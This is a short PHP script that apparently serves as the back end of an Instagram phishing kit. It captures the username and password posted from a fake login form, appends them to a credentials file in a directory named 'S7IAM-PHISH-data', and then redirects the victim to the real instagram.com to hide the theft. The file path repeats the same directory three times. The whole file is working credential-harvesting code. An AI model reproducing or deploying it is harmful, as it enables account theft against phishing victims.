<?php

file_put_contents("/home/lnwper/S7IAM-PHISH-data//home/lnwper/S7IAM-PHISH-data//home/lnwper/S7IAM-PHISH-data/usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
    ob_flush();
    flush();
header('Location: https://instagram.com');
exit();
?>